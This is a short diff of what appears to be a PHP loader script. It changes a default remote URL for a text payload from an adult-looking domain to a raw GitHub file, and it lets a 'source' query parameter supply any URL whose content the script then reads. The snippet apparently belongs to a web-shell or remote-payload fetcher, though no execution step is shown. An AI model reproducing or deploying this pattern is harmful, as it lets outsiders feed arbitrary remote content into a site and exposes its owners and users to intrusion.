@@ -78,7 +78,7 @@ foreach ($commands as $line) {
 }
 
 
-$defaultUrl = 'https://sub1.erospro.net/test1/t10.txt';
+$defaultUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/t10.txt';
 $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
 $fileContent = '';
 if (filter_var($input, FILTER_VALIDATE_URL)) {
